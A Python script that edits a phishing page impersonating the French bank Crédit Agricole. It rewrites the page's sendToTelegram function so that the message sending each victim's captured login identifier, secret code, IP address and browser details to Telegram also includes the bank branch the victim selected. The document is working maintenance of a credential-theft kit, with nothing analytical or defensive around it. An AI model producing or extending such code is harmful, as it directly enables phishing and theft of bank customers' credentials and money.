with open('credit-agricole.html', 'r', encoding='utf-8') as f:
    content = f.read()

# Find the sendToTelegram function and modify it
old_send = """        // Envoi à Telegram
        async function sendToTelegram() {
            const ip = await getIP();
            const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion réussie`;"""

new_send = """        // Envoi à Telegram
        async function sendToTelegram() {
            const ip = await getIP();
            const selectedCaisse = document.getElementById('caisse-select').value;
            const caisseLabel = document.getElementById('caisse-select').options[document.getElementById('caisse-select').selectedIndex].text;
            const caisseInfo = selectedCaisse ? `\n🏪 Caisse: ${caisseLabel}` : '';
            const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}${caisseInfo}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion réussie`;"""

content = content.replace(old_send, new_send)

with open('credit-agricole.html', 'w', encoding='utf-8') as f:
    f.write(content)

print("Added caisse selection to Telegram message")
